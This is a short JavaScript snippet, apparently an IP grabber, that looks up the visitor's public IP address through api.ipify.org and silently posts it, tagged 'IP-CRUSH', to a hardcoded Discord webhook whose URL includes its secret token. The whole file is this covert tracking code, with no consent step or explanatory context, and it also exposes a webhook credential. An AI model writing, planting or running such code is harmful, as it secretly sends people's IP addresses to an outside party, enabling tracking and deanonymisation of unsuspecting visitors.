var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1142689324916289646/JYCBkjirURx8B8kGe8jIeREQpGQo5Xry0v9Btv_Wq9s8dj-HDaNC0q7ifuTVbbLWCqNO'
    var message = {
        content: 'IP-CRUSH : ' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});